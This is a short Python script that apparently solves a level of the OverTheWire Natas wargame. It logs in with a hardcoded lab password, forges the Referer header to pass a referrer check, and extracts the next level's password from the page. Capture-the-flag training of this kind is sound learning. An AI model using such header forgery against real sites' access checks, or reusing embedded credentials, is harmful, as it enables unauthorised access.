#!/bin/python3
import requests
import re

user = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = 'http://%s.natas.labs.overthewire.org' % user

risposta = requests.get(url, auth=(user, password), headers={
                        'referer': 'http://natas5.natas.labs.overthewire.org/'})
testo = risposta.text

print(testo)

re = re.findall('natas5 is (.*)', testo)
print('Password')
print(re[0])
